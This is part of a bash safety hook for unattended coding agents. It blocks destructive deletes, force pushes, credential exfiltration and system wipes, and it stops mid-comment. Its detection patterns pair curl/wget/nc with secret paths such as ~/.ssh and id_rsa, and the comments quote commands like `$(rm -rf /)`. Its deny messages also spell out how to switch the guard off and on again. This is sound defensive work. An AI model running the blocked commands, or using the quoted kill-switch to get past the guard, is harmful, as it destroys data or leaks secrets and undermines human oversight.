#!/usr/bin/env bash
# tripwire-guard.sh — PreToolUse deny-hook (Bash tool ONLY; Edit/Write have domain guards).
# =============================================================================
# PreToolUse hooks fire even under --dangerously-skip-permissions, so this
# file is the explicit, versioned safety layer for unattended agents running
# with bypassPermissions.
#
# DENY (exit 2 + one-line stderr reason) ONLY these classes; everything else
# exits 0 fast:
#   1. Recursive deletes judged by WHAT WOULD BE LOST, not by where the path is:
#      rm -r (any flag order, incl. --recursive), find … -delete, git clean -f.
#      Each target is classified once (classify_delete_target) into one of:
#        never    — /, $HOME, a system root, a personal category root, /tmp
#                   itself, or an unguarded `$VAR` target whose unset expansion
#                   IS a root delete. HARD in every mode, no ask.
#        sacred   — someone else's or the machine's: a `main/` checkout, a
#                   project container under ~/code, a container's `worktrees/`
#                   or `pins/` collection root, any `pins/<full-object-id>`
#                   (raw deletion is forbidden; verified orphan retirement uses
#                   `pin-retire`), ~/code/*-data,
#                   ~/.local/state/north, ~/code/resources, a
#                   `worktrees/<slug>` lane this session is not working in, any
#                   `.git`, any checkout root. HARD in every mode, no ask.
#                   A lane is this session's when the session cwd is in it, the
#                   command creates it (`git worktree add`), the transcript
#                   records creating it, or the command cd's into it.
#        gone     — the path does not exist: nothing to lose. ALLOW.
#        scratch  — strictly inside a declared agent scratch root (Wisp's
#                   LAN/online client and run copies under
#                   $XDG_DATA_HOME/wisp/{lan,online}/), lexically AND after
#                   following symlinks. Agents make these copies and remake
#                   them on demand. ALLOW.
#        regen    — provably regenerable: $XDG_CACHE_HOME, /tmp/*, /var/tmp,
#                   $TMPDIR/*, /run/user/*, node_modules/__pycache__/&c, and
#                   anything git itself declares ignored. ALLOW.
#        tracked  — inside a repo with nothing untracked or modified under it:
#                   git restores it. ALLOW.
#        own      — only new files, inside a lane the session cwd, this
#                   command or the transcript shows is this session's: its own
#                   scratch. ALLOW. (A cd alone does not count here.)
#        dirty    — inside a repo, but untracked/modified content under the
#                   target that git cannot restore. DENY.
#        personal — under $HOME, no version control, no cache: DENY.
#        unknown  — unclassifiable: DENY (blocking is the safe default).
#      Every tier is allow or deny in every permission mode: the guard never
#      asks the operator. Each deny names the move that works instead.
#      Claude Code's own dangerous-rm dialog cannot be skipped by a PreToolUse
#      allow, so this file is also wired to PermissionRequest:Bash. There it
#      answers every prompt for a deleting command: deny with this guard's
#      reason, deny a recursive target it cannot read, otherwise allow.
#      Relative targets resolve where the command really runs: a `cd`/`pushd`
#      joined by `&&` moves later commands; joined any other way (it may fail)
#      both directories are judged; a cd in a pipe never moves the shell, and
#      one inside ( ), $( ), backticks or if/for/while/case/{ } leaves both
#      directories judged after the block closes.
#      Variables set earlier in the same command (`S=/tmp/x; rm -rf $S/y`,
#      `D=$(mktemp -d); … rm -rf "$D"`) resolve to their value when it surely
#      holds: not inside a pipe, not after `||`, and a value set inside a block
#      is forgotten when the block closes. Any other `$VAR` stays unknown.
#      Heredoc bodies are data unless a shell reads them or the file they write
#      is run later in the same command.
#      PROPORTIONALITY: a bounded `find … -type f -mtime +N -delete` and an
#      `rm -rf` of the same directory are both blocked, but the reason says
#      which one it is — the friction should read as sized to the act.
#   2. Force-push / history rewrite: git push with -f/--force/--force-with-lease/
#      --mirror/--delete/--prune; and raw `git push` (house policy: safe-push
#      only). safe-push's inner push exports SAFE_PUSH_ACTIVE=1 → allowed.
#   3. Credential exfil surface: a secret-ish path (.ssh/, .aws/ — incl. the
#      bare dirs ~/.ssh ~/.aws — *_SECRET*, *.pem, id_rsa/id_ed25519/id_ecdsa,
#      .config/sops, /run/secrets, *.age)
#      AND a network verb (curl/wget/nc/ncat/netcat) in the SAME command,
#      non-localhost; PLUS ssh in the pipe-in shape ONLY — a secret path in an
#      earlier PIPE stage (`secret … | ssh host …`) feeding ssh's stdin.
#      Plain local reads of secret paths: ALLOWED — the tripwire is the exfil
#      COMBINATION. ssh/scp `-i <keyfile>` is authentication, not exfil: the
#      token after -i is excluded from the secret scan. Secrets in ssh's OWN
#      args (a remote read like `ssh box 'grep X_SECRET .env'`) stay ALLOWED —
#      only local material piped INTO ssh trips (see the ssh dispatch note).
#   4. Outbound uploads: curl/wget with -T/--upload-file/-d @f/--data-binary @f/
#      -F x=@f/--post-file to non-localhost; scp/rsync ONLY when a SOURCE is a
#      secret-ish path and the DESTINATION (last non-flag arg) is a remote,
#      non-localhost host. Non-secret scp/rsync uploads are ALLOWED (see the
#      ssh dispatch note): `scp f box:` moves the bytes the allowed
#      `ssh box 'cat > f' < f` already moves, so a destination allowlist would
#      only tax the honest path.
#   5. Destructive system ops: mkfs*, dd of=/dev/* (except null/stdout/stderr),
#      shutdown/reboot/poweroff/halt, systemctl power subcommands,
#      chmod -R 000, chown -R root. Service lifecycle operations are allowed;
#      authorization for them belongs to the task, not this lexical guard.
#
# Design constraints honored:
#   - pure bash + coreutils; jq only on the slow path for correct JSON string
#     decode (NO python — this runs on EVERY Bash call). Fork budget: fast path
#     0 forks (case-glob prescreen), slow path 2 (jq). A class-1 target adds one
#     `realpath -sm`, and only if the fork-free tiers (never / sacred / gone /
#     scratch) all decline does it ask git: `rev-parse`, then `check-ignore`,
#     then a PATH-SCOPED `status --porcelain` — the enumeration is bounded by
#     the target, and the ignored case (node_modules and friends) never reaches
#     the status call.
#   - FAIL-OPEN on anything unparseable — this is a tripwire for clear
#     destructive patterns, not a general classifier. Deliberate accepted
#     misses: `bash -c "…"`/xargs indirection, and find with \( \) grouping (the
#     grouped -delete lands in another segment). A $VAR delete target is NOT a
#     miss any more — it is class 1's unguarded-variable deny.
#   - Every DENY is (1) appended to ~/.local/state/north/tripwire.log (ISO ts <TAB>
#     cwd <TAB> reason <TAB> command head) so north-mine can audit, AND (2) routed
#     through the guard_denial fact idiom (sdk/src/guard-log.ts): a titleless
#     @denial:<agent>-<ts> subject, kind=guard_denial + agent/guard/tool/target/reason/at
#     + source=tripwire — so the block is ATTRIBUTED (which agent) and queryable off the
#     graph, not just a loose unattributed TSV line. Fire-and-forget + detached: a
#     fact-write failure NEVER delays or breaks the DENY; the file line stays regardless.
#
# Test matrix: sibling tripwire-guard.test.sh — run it after EVERY edit here.
# Kill-switch: persistent `north config agents off tripwire-guard` OR env
# AGENT_NO_AUTHORING_HOOKS (any value but 0/false; 0/false forces guards live).
# Shared impl: lib/authoring-killswitch.sh. House parity.
# =============================================================================
set -uo pipefail

# Drain before every decision, including the kill-switch. Keep active-path input
# memory-bounded; an oversized envelope follows the existing malformed fail-open.
capture_hook_stdin() {
  local chunk status keep
  local LC_ALL=C
  payload=""
  payload_oversized=0
  while :; do
    chunk=""
    IFS= read -r -N 65536 chunk
    status=$?
    if [ -n "$chunk" ]; then
      keep=$((1048576 - ${#payload}))
      [ "$keep" -le 0 ] || payload+="${chunk:0:$keep}"
      [ "${#chunk}" -le "$keep" ] || payload_oversized=1
    fi
    [ "$status" -eq 0 ] || break
  done
}
capture_hook_stdin

[ "$payload_oversized" -eq 0 ] || exit 0

[ -n "$payload" ] || exit 0

# ---- prescreen: cheap case-glob on the raw JSON; superset of every deny class.
# Over-matching (e.g. "confirm" hits *rm*, "branch" hits *nc*) just falls
# through to the fork-light parse below, which decides correctly.
# shellcheck disable=SC2221,SC2222  # false positive: "netcat" has no "nc" substring
case "$payload" in
  *rm*|*-delete*|*clean*|*push*|*curl*|*wget*|*nc*|*netcat*|*ssh*|*scp*|*rsync*|\
  *mkfs*|*dd*|*shutdown*|*reboot*|*poweroff*|*halt*|*systemctl*|*chmod*|*chown*) ;;
  *) exit 0 ;;
esac

# Kill-switch: shared semantics in lib/authoring-killswitch.sh — persistent
# `north config agents off tripwire-guard` (live) or env AGENT_NO_AUTHORING_HOOKS
# (any value but 0/false kills this session; 0/false forces guards live).
authoring_killswitch="$(dirname "$0")/lib/authoring-killswitch.sh"
[ -r "$authoring_killswitch" ] \
  || authoring_killswitch="$(dirname "$0")/../lib/authoring-killswitch.sh"
# shellcheck disable=SC1090,SC1091
. "$authoring_killswitch" 2>/dev/null || true
type authoring_guards_off >/dev/null 2>&1 && authoring_guards_off && exit 0

command -v jq >/dev/null 2>&1 || { hook_error missing-interpreter; exit 0; }
cmd="$(jq -r '.tool_input.command // empty' <<<"$payload" 2>/dev/null)" || { hook_error unparsable-payload; exit 0; }
[ -n "$cmd" ] || exit 0

# cwd is only needed by the deletion classes + the deny log — extract lazily
# so the common slow path (prescreen over-match, then allow) pays one jq, not two.
cwd="" CWD_SET=0
ensure_cwd() {
  [ "$CWD_SET" = 1 ] && return 0
  cwd="$(jq -r '.cwd // empty' <<<"$payload" 2>/dev/null || true)"
  [ -n "$cwd" ] || cwd="$PWD"
  CWD_SET=1
}

LOGDIR="${TRIPWIRE_LOG_DIR:-$HOME/.local/state/north}" # override: tests only

# resolve_agent_id -> stdout : who is running this Bash call. SAME resolution order as
# bin/north-on-tooluse — the per-session cache is the truth (env is ambient + inheritable,
# so a parent's NORTH_AGENT_ID leaks into subagents; cache is keyed by session_id and
# cannot alias), env is the fallback for an SDK-dispatched process whose spawn hook never
# fired, then a derived session id. jq is already known-present here (deny fires only after
# the slow path parsed the command with it).
resolve_agent_id() {
  local sid rn repo id cache
  sid="$(jq -r '.session_id // empty' <<<"$payload" 2>/dev/null || true)"
  ensure_cwd
  repo="$(git -C "$cwd" rev-parse --show-toplevel 2>/dev/null || echo "$cwd")"
  rn="$(basename "$repo")"
  id=""
  cache="${XDG_RUNTIME_DIR:-/tmp}/north-agent-ids/$sid"
  [ -n "$sid" ] && [ -r "$cache" ] && id="$(cat "$cache" 2>/dev/null || true)"
  [ -z "$id" ] && id="${NORTH_AGENT_ID:-}"
  [ -z "$id" ] && id="session-$rn-${sid:0:8}"
  [ "$id" = "session-$rn-" ] && id="session-$rn-unknown"
  printf '%s' "$id"
}

# record_denial_fact REASON TARGET : route this DENY ALSO through the guard_denial fact
# idiom (sdk/src/guard-log.ts) — a titleless @denial:<agent>-<ts> subject with
# kind=guard_denial + the mirror predicates (agent/guard/tool/target/reason/at) +
# source=tripwire, so a worker block is attributed + queryable off the graph. The
# tripwire.log line stays (belt and braces). DETACHED (setsid, fully disowned) +
# error-swallowed: a fact-write failure / slow coordinator / down daemon must NEVER delay
# or break the exit-2 the guard already decided. The resolved `north` path is passed into
# the child so it never depends on the detached env's PATH.
record_denial_fact() {
  local reason="$1" target="$2" nbin id at subj
  # NORTH_BIN override mirrors guard-log.ts / telemetry.ts / death.ts — tests point it at
  # a no-op (/bin/true) so the suite never writes denial facts to the live graph.
  nbin="${NORTH_BIN:-$(command -v north 2>/dev/null || true)}"
  [ -n "$nbin" ] || return 0 # no CLI on PATH -> the file line above is enough
  id="$(resolve_agent_id)"
  at="$(date -Is 2>/dev/null || true)"
  subj="denial:${id}-$(date +%s%N 2>/dev/null || echo 0)"
  setsid bash -c '
    n=$1 s=$2 ag=$3 at=$4 tg=$5 rs=$6
    "$n" tell "$s" kind guard_denial
    "$n" tell "$s" agent "$ag"
    "$n" tell "$s" guard tripwire-guard
    "$n" tell "$s" tool Bash
    "$n" tell "$s" source tripwire
    [ -n "$at" ] && "$n" tell "$s" at "$at"
    [ -n "$tg" ] && "$n" tell "$s" target "$tg"
    [ -n "$rs" ] && "$n" tell "$s" reason "$rs"
  ' _ "$nbin" "$subj" "$id" "$at" "$target" "$reason" >/dev/null 2>&1 &
  disown 2>/dev/null || true
}

# EVENT is PreToolUse (exit 2 + stderr) or PermissionRequest (a JSON decision).
# The raw-text test keeps the PreToolUse slow path at its two jq forks.
EVENT="" EV_SET=0
ensure_event() {
  [ "$EV_SET" = 1 ] && return 0
  case "$payload" in
    *PermissionRequest*) EVENT="$(jq -r '.hook_event_name // empty' <<<"$payload" 2>/dev/null || true)" ;;
  esac
  EV_SET=1
}

permission_answer() { # permission_answer allow|deny [MESSAGE]
  jq -cn --arg b "$1" --arg m "${2:-}" \
    '{hookSpecificOutput:{hookEventName:"PermissionRequest",decision:({behavior:$b} + (if $m == "" then {} else {message:$m} end))}}'
}

deny() {
  ensure_cwd
  local head="${cmd//$'\n'/ }"
  head="${head:0:200}"
  mkdir -p "$LOGDIR" 2>/dev/null || true
  printf '%s\t%s\t%s\t%s\n' "$(date -Is)" "$cwd" "$1" "$head" \
    >>"$LOGDIR/tripwire.log" 2>/dev/null || true
  record_denial_fact "$1" "$head" # ALSO route to the guard_denial graph idiom (fire-and-forget)
  ensure_event
  if [ "$EVENT" = PermissionRequest ]; then
    permission_answer deny "tripwire: $1"
    exit 0
  fi
  printf 'tripwire: %s\n' "$1" >&2
  exit 2
}

# DELETE_SEEN: the command deletes something (any rm/rmdir/unlink, find -delete,
# git clean -f). UNREAD: a recursive-delete target this guard could not read.
DELETE_SEEN=0 UNREAD=""

# ---- tokenize: normalize separators to standalone tokens, then word-split.
# Three separator kinds, kept DISTINCT: hard boundaries (";" — from ; || & $( ` \n,
# and "&&") end a command's stdin, a pipe ("|") does NOT; "&&" alone also tells
# the cwd tracker a preceding `cd` succeeded. The segment walk treats both as
# segment breaks; only the ssh pipe-in check cares which — a secret in an earlier
# PIPE stage flows into ssh's stdin (exfil), a secret before a hard ";" does not.
# "$(" is split (catches `$(rm -rf /)`); bare "(" is NOT (keeps find \( \) intact);
# strip_g trims a trailing ")" instead. Quoted strings split on spaces — fine for
# detection: dispatch keys off the segment's COMMAND WORD, so words inside quoted
# args (`git commit -m "never push"`) can't false-positive.
# ---- heredoc bodies are data. A body stays in the command text only when a
# shell reads it (`bash <<EOF`, `cat <<EOF | sh`), when an unquoted body holds a
# substitution the outer shell runs, or when the file it writes is run later in
# this same command (`cat > x.sh <<EOF … EOF; bash x.sh`).
HD_SHELLS=' bash sh zsh dash ksh source . eval '
hd_command() { # hd_command WORDS... -> $HD_WORD (basename) + $HD_ARG (first operand)
  local w skip=0 found=0
  HD_WORD="" HD_ARG=""
  for w in "$@"; do
    if [ "$skip" = 1 ]; then skip=0; continue; fi
    w="${w#[\"\']}"
    w="${w%[\"\']}"
    if [ "$found" = 1 ]; then
      case "$w" in -*) continue ;; esac
      HD_ARG="${w##*/}"
      return 0
    fi
    case "$w" in
      sudo | env | command | exec | nohup | time | nice | stdbuf | builtin | -*) continue ;;
      timeout) skip=1; continue ;;
      [A-Za-z_]*=*) continue ;;
    esac
    HD_WORD="${w##*/}"
    found=1
  done
}
runs_file() { # runs_file LINE BASE : some segment of LINE runs a file named BASE
  local text="$1" seg
  local -a segs words
  text="${text//&&/;}"
  IFS=$';|&()`' read -r -a segs <<<"$text"
  for seg in ${segs[@]+"${segs[@]}"}; do
    read -r -a words <<<"$seg" || true
    [ "${#words[@]}" -gt 0 ] || continue
    hd_command "${words[@]}"
    case "$HD_SHELLS" in
      *" $HD_WORD "*) [ "$HD_ARG" = "$2" ] && return 0 ;;
      *) [ "$HD_WORD" = "$2" ] && return 0 ;;
    esac
  done
  return 1
}
strip_heredocs() { # strip_heredocs CMD -> $CMD_EFF
  CMD_EFF="$1"
  case "$1" in *'<<'*) ;; *) return 0 ;; esac
  local re='(^|[^<])<<(-?)[[:space:]]*(\\?)(["'"'"']?)([A-Za-z_][A-Za-z0-9_]*)'
  local nl i j h line rest before after seg tail delim dash unq keep file body l out m0 m1
  local -a L words HS HE HK HF pd pdash punq pkeep pfile
  mapfile -t L <<<"$1"
  nl=${#L[@]}
  i=0
  while [ "$i" -lt "$nl" ]; do
    line="${L[$i]}"
    i=$((i + 1))
    rest="$line" before=""
    pd=() pdash=() punq=() pkeep=() pfile=()
    while [[ "$rest" =~ $re ]]; do
      m0="${BASH_REMATCH[0]}" m1="${BASH_REMATCH[1]}"
      before+="${rest%%"$m0"*}$m1"
      after="${rest#*"$m0"}"
      dash="${BASH_REMATCH[2]}"
      unq=0
      [ -z "${BASH_REMATCH[3]}${BASH_REMATCH[4]}" ] && unq=1
      delim="${BASH_REMATCH[5]}"
      after="${after#[\"\']}"
      seg="${before##*[;|&(\`]}"
      tail="${after%%[;|&]*}"
      read -r -a words <<<"$seg" || true
      HD_WORD=""
      [ "${#words[@]}" -gt 0 ] && hd_command "${words[@]}"
      keep=0
      case "$HD_SHELLS" in *" $HD_WORD "*) [ -n "$HD_WORD" ] && keep=1 ;; esac
      [[ "$after" =~ \|[[:space:]]*(sudo[[:space:]]+)?(bash|sh|zsh|dash|ksh)([[:space:]]|$) ]] && keep=1
      file=""
      if [ "$HD_WORD" = tee ]; then
        file="$HD_ARG"
      elif [[ "$seg $tail" =~ (^|[^0-9\&\<\>])\>\>?[[:space:]]*([^[:space:]\;\|\&\<\>]+) ]]; then
        file="${BASH_REMATCH[2]}"
        file="${file#[\"\']}"
        file="${file%[\"\']}"
        file="${file##*/}"
      fi
      pd+=("$delim") pdash+=("$dash") punq+=("$unq") pkeep+=("$keep") pfile+=("$file")
      before+="${m0#"$m1"}"
      rest="$after"
    done
    for ((h = 0; h < ${#pd[@]}; h++)); do
      HS+=("$i")
      body=""
      while [ "$i" -lt "$nl" ]; do
        l="${L[$i]}"
        [ "${pdash[$h]}" = - ] && l="${l#"${l%%[!$'\t']*}"}"
        i=$((i + 1))
        [ "$l" = "${pd[$h]}" ] && break
        body+="$l"$'\n'
      done
      HE+=("$((i - 1))")
      keep="${pkeep[$h]}"
      if [ "${punq[$h]}" = 1 ]; then
        case "$body" in *'$('* | *'`'*) keep=1 ;; esac
      fi
      HK+=("$keep") HF+=("${pfile[$h]}")
    done
  done
  [ "${#HS[@]}" -gt 0 ] || return 0
  in_body() { # in_body LINE -> 0 when LINE is a body line of a blanked heredoc
    local b
    for ((b = 0; b < ${#HS[@]}; b++)); do
      [ "${HK[$b]}" = 0 ] && [ "$1" -ge "${HS[$b]}" ] && [ "$1" -le "${HE[$b]}" ] && return 0
    done
    return 1
  }
  for ((h = 0; h < ${#HS[@]}; h++)); do
    [ "${HK[$h]}" = 0 ] && [ -n "${HF[$h]}" ] || continue
    for ((j = HS[h] - 1; j < nl; j++)); do
      [ "$j" -ge "${HS[$h]}" ] && [ "$j" -le "${HE[$h]}" ] && continue
      in_body "$j" && continue
      if runs_file "${L[$j]}" "${HF[$h]}"; then HK[h]=1; break; fi
    done
  done
  out=""
  for ((j = 0; j < nl; j++)); do
    in_body "$j" && continue
    out+="${L[$j]}"$'\n'
  done
  CMD_EFF="${out%$'\n'}"
}
strip_heredocs "$cmd"

norm="$CMD_EFF"
norm="${norm//\\$'\n'/ }" # line continuation first — keep the logical line whole
norm="${norm//$'\n'/ ; }"
norm="${norm//$'\t'/ }"
# A substitution leaves SUB glued where its output lands, so a word built from
# one reads as unknown (like a $VAR) instead of as its literal prefix alone.
SUB=$'\x02'
# shellcheck disable=SC2016  # literal $( — command substitution opener in the TEXT
norm="${norm//'$('/$SUB ; ( }"
# Backticks alternate open/close; each becomes a subshell boundary.
bt_open=1
while [[ "$norm" == *'`'* ]]; do
  if [ "$bt_open" = 1 ]; then norm="${norm/\`/$SUB ; ( }"; bt_open=0
  else norm="${norm/\`/ ) ; }"; bt_open=1; fi
done
unset bt_open
and_mark=$'\x01' or_mark=$'\x03'
norm="${norm//&&/ $and_mark }" # && kept DISTINCT: only it makes a `cd` certain
norm="${norm//'||'/ $or_mark }" # || kept DISTINCT: an assignment after it may not run
norm="${norm//;/ ; }"
norm="${norm//|/ | }" # single pipe kept DISTINCT from ";" (stdin flows across it)
norm="${norm//&/ ; }"
norm="${norm//$and_mark/\&\&}" # \& : a bare & in a replacement is the match
norm="${norm//$or_mark/||}"
unset and_mark or_mark
read -r -a TOK <<<"$norm" || exit 0
[ "${#TOK[@]}" -gt 0 ] || exit 0

# strip_g TOKEN -> $S : trim wrapping quotes + a trailing ")". No subshell.
strip_g() {
  S="$1"
  S="${S#\"}"; S="${S%\"}"
  S="${S#\'}"; S="${S%\'}"
  S="${S%\)}"
}

REPO_ROOT="" REPO_ROOT_SET=0
ensure_repo_root() {
  [ "$REPO_ROOT_SET" = 1 ] && return 0
  ensure_cwd
  REPO_ROOT="$(git -C "$cwd" rev-parse --show-toplevel 2>/dev/null || true)"
  REPO_ROOT_SET=1
}

# VARS: shell variables this command sets to a value known before it runs (see
# assignment_segment). VDEPTH: the block depth each was set at; closing that
# block forgets it, because a value set inside a block may not have run.
declare -A VARS=() VDEPTH=()
VARS[HOME]="$HOME"

# expand_known WORD -> $EXP : substitute the variables in VARS; unknown ones
# stay as written, so the unset-variable rules below still see them.
expand_known() {
  local w="$1" out="" name
  EXP="$w"
  case "$w" in *'$'*) ;; *) return 0 ;; esac
  while [[ "$w" =~ \$\{([A-Za-z_][A-Za-z0-9_]*)(:\?[^}]*)?\}|\$([A-Za-z_][A-Za-z0-9_]*) ]]; do
    name="${BASH_REMATCH[1]:-${BASH_REMATCH[3]}}"
    out+="${w%%"${BASH_REMATCH[0]}"*}"
    if [ -n "${VARS[$name]+x}" ]; then out+="${VARS[$name]}"; else out+="${BASH_REMATCH[0]}"; fi
    w="${w#*"${BASH_REMATCH[0]}"}"
  done
  EXP="$out$w"
}

# resolve_path TOKEN -> $RES (canonical abs path); return 1 = unresolvable (fail-open).
resolve_path() {
  strip_g "$1"
  expand_known "$S"
  local t="$EXP"
  # shellcheck disable=SC2016,SC2088  # matching LITERAL ~ / $HOME text in the command
  case "$t" in
    '~' | '$HOME' | '${HOME}') t="$HOME" ;;
    '~/'*) t="$HOME/${t#'~/'}" ;;
    '$HOME/'*) t="$HOME/${t#'$HOME/'}" ;;
    '${HOME}/'*) t="$HOME/${t#'${HOME}/'}" ;;
    /*) ;;
    '~'*) return 1 ;; # ~otheruser — can't resolve cheaply
    *)
      ensure_cwd
      t="${rcwd:-$cwd}/$t"
      ;;
  esac
  t="${t%%[*?]*}" # glob → its literal prefix (rm -rf /x/* judges /x/)
  case "$t" in
    *'$'* | *'`'* | *"$SUB"*) return 1 ;; # unexpanded substitution mid-path
    '') return 1 ;;
  esac
  # -s: LEXICAL canonicalization only — never follow symlinks. rm on a symlink
  # removes the link, not the target; resolving would false-positive on nix
  # `result` links (they point into /nix/store, "outside" the repo).
  RES="$(realpath -sm -- "$t" 2>/dev/null)" || return 1
  [ -n "$RES" ] || return 1
}

# ---- class 1: what would be lost, and whose is it ---------------------------
# The tiers, and the ORDER, are the whole rule: both HARD tiers are decided
# before any tier that can allow, so "it does not exist" or "it is a cache" can
# never speak for a main checkout, a sibling lane, or a root.

CACHE_ROOT="${XDG_CACHE_HOME:-$HOME/.cache}"
# The deliberate path, quoted verbatim in every personal/dirty deny reason: it is the move
# that worked, and a denial that does not name the exit is a trap.
OVERRIDE='deliberate path: `north config agents off tripwire-guard`, run it, `north config agents on tripwire-guard`'

# is_never_path PATH : exact roots whose recursive delete is catastrophic in
# every mode. /tmp is here as the ROOT (other lanes' scratchpads live in it);
# /tmp/<anything> is a regen path below.
is_never_path() {
  case "$1" in
    / | /bin | /boot | /dev | /etc | /home | /lib | /lib64 | /nix | /opt | /proc | \
      /root | /run | /sbin | /srv | /sys | /tmp | /usr | /var) return 0 ;;
  esac
  case "$1" in
    "$HOME" | "$HOME"/code | "$HOME"/Desktop | "$HOME"/Documents | "$HOME"/Downloads | \
      "$HOME"/Music | "$HOME"/Pictures | "$HOME"/Videos | "$HOME"/.config | \
      "$HOME"/.gnupg | "$HOME"/.local | "$HOME"/.local/share | "$HOME"/.local/state | \
      "$HOME"/.ssh) return 0 ;;
  esac
  return 1
}

# is_under_scratch PATH : roots whose contents are regenerable BY DEFINITION —
# XDG cache (the spec's own words: deletable without loss of data), the temp
# hierarchy, the runtime dir. Also the prefix test for a mid-path variable.
is_under_scratch() {
  case "$1" in
    "$CACHE_ROOT" | "$CACHE_ROOT"/* | /tmp | /tmp/* | /var/tmp | /var/tmp/* | \
      /run/user/*) return 0 ;;
  esac
  if [ -n "${TMPDIR:-}" ]; then
    local td="${TMPDIR%/}"
    case "$1" in "$td" | "$td"/*) return 0 ;; esac
  fi
  return 1
}

# is_cache_path PATH : the XDG cache tree, plus directories whose creating tool
# rebuilds them on demand. Repository-declared ignores are handled by git itself
# in the classifier — this list is only for paths outside a checkout. Checked
# BEFORE the $HOME tier, because the cache lives under $HOME and is the one
# thing there that is regenerable by definition.
is_cache_path() {
  case "$1" in
    "$CACHE_ROOT" | "$CACHE_ROOT"/*) return 0 ;;
  esac
  case "${1##*/}" in
    node_modules | __pycache__ | .pytest_cache | .mypy_cache | .ruff_cache | \
      .direnv | .gradle) return 0 ;;
  esac
  return 1
}

# is_disposable PATH : regenerable without asking git — the XDG cache anywhere,
# and the temp hierarchy when it is NOT inside $HOME. The $HOME exclusion is the
# safe reading of an ambiguous layout: a scratch root someone put under $HOME is
# personal data until something proves otherwise.
is_disposable() {
  is_cache_path "$1" && return 0
  case "$1" in "$HOME"/*) return 1 ;; esac
  is_under_scratch "$1"
}

# sacred_owner_reason PATH : the machine's own memory, or another lane's work —
# decided by WHOSE it is, before anything about git. Sets $WHY, returns 0 on a
# match. Path shape only: no forks.
sacred_owner_reason() {
  local p="$1" pre rest slug wt
  WHY=""
  case "$p" in
    "$HOME"/code/*-data | "$HOME"/code/*-data/*)
      WHY="'$p' is machine memory — a ~/code/*-data runtime store that live lanes read, and nothing regenerates it. Prune it with the tool that owns it, never with a recursive delete"
      return 0
      ;;
    "$HOME"/.local/state/north | "$HOME"/.local/state/north/*)
      WHY="'$p' is North's own state (coordination graph, session ledger) and other sessions are reading it right now"
      return 0
      ;;
    "$HOME"/code/resources | "$HOME"/code/resources/*)
      WHY="'$p' is ~/code/resources — read-only context; agents never edit or delete there"
      return 0
      ;;
    # The pin tiers come FIRST, ahead of the main tier and ahead of
    # sacred_reason's generic checkout-root tier: a pin holds a .git, so the
    # generic tier would already deny it — but with the wrong WHY, one that
    # sends the agent to `worktree remove` the very thing being protected.
    "$HOME"/code/*/pins)
      WHY="'$p' is a container's pins/ root — every content-addressed checkout in that project at once, plus the .pin manifests that record who consumes them. Sweepers and raw recursive deletion never operate here; retire one verified orphan with pin-retire"
      return 0
      ;;
    "$HOME"/code/*/pins/*)
      pre="${p%%/pins/*}"
      rest="${p#"$pre"/pins/}"
      slug="${rest%%/*}"
      wt="$pre/pins/$slug"
      WHY="'$p' is in a content-addressed pin whose consumer state must be verified. Its contents, HEAD, and path are immutable while any consumer remains. Advance consumers with a new hash-named pin; after every real consumer moves, retire this pin and sidecar with: pin-retire --consumer-main CONSUMER/main -- '$wt'. Raw deletion stays denied"
      return 0
      ;;
    "$HOME"/code/*/worktrees)
      WHY="'$p' is a container's worktrees/ root — every concurrent lane in that project at once, including lanes this session cannot see. Name the ONE lane you mean: $p/SLUG"
      return 0
      ;;
    "$HOME"/code/*/main | "$HOME"/code/*/main/*)
      WHY="'$p' is inside a 'main' checkout — production, and any dirty state in it is human work-in-progress. Work in a lane: git -C CONTAINER/main worktree add CONTAINER/worktrees/SLUG -b SLUG"
      return 0
      ;;
  esac
  case "$p" in
    "$HOME"/code/*)
      rest="${p#"$HOME"/code/}"
      case "$rest" in
        */*) ;;
        *)
          WHY="'$p' is a project container — main/, every lane under worktrees/, and every pin under pins/ go together. Name one directory inside it instead"
          return 0
          ;;
      esac
      ;;
  esac
  # Cross-lane protection, keyed on the `worktrees/` PATH SEGMENT. It used to
  # key on the `wt-` leaf prefix; with bare slugs that pattern matches nothing,
  # and this whole tier would fail OPEN with no error at all.
  case "$p" in
    */worktrees/*)
      pre="${p%%/worktrees/*}"
      case "$pre" in
        "$HOME"/code*)
          rest="${p#"$pre"/worktrees/}"
          slug="${rest%%/*}"
          wt="$pre/worktrees/$slug"
          if ! owns_lane "$wt"; then
            if [ "$p" = "$wt" ]; then
              WHY="'$p' is another session's worktree"
            else
              WHY="'$p' is inside $wt, another session's worktree"
            fi
            WHY="$WHY — it may hold in-flight work this session cannot see (several lanes run concurrently here). If it is your lane, cd into it in the same command (cd $wt && rm -r RELATIVE/PATH); if it has landed: git -C $pre/main worktree remove $wt"
            return 0
          fi
          ;;
      esac
      ;;
  esac
  return 1
}

# lane_of PATH -> $LANE : the ~/code/<project>/worktrees/<slug> lane PATH is in.
lane_of() {
  local pre rest
  LANE=""
  case "$1" in */worktrees/*) ;; *) return 1 ;; esac
  pre="${1%%/worktrees/*}"
  case "$pre" in "$HOME"/code*) ;; *) return 1 ;; esac
  rest="${1#"$pre"/worktrees/}"
  LANE="$pre/worktrees/${rest%%/*}"
}

# owns_lane WT : this session works in lane WT — lane_strong, or a cd into it in
# this command. A cd shows where the command runs, not who made the lane, so it
# lifts only the cross-lane refusal; new files there stay protected.
# lane_strong WT : the session cwd is in it, this command creates it, or the
# session transcript records creating it.
CD_DIRS=() CREATED_LANES=()
owns_lane() {
  local wt="$1" c
  lane_strong "$wt" && return 0
  for c in ${CD_DIRS[@]+"${CD_DIRS[@]}"}; do
    case "$c/" in "$wt"/*) return 0 ;; esac
  done
  return 1
}
lane_strong() {
  local wt="$1" c
  ensure_cwd
  case "$cwd/" in "$wt"/*) return 0 ;; esac
  for c in ${CREATED_LANES[@]+"${CREATED_LANES[@]}"}; do [ "$c" = "$wt" ] && return 0; done
  transcript_made_lane "$wt"
}
# transcript_made_lane WT : a `worktree add` line naming this lane in the
# session's own transcript (Claude subagents report theirs separately).
transcript_made_lane() {
  local slug="${1##*/}" tp
  local -a tps
  case "$slug" in '' | *[!A-Za-z0-9._-]*) return 1 ;; esac
  mapfile -t tps < <(jq -r '.agent_transcript_path // empty, .transcript_path // empty' <<<"$payload" 2>/dev/null)
  for tp in ${tps[@]+"${tps[@]}"}; do
    [ -f "$tp" ] && [ -r "$tp" ] || continue
    grep -F -- "worktree add" "$tp" 2>/dev/null |
      grep -q -E -- "worktrees/${slug//./\\.}([^A-Za-z0-9._-]|\$)" && return 0
  done
  return 1
}

# sacred_reason PATH : ownership, plus the two that only a DELETE can destroy —
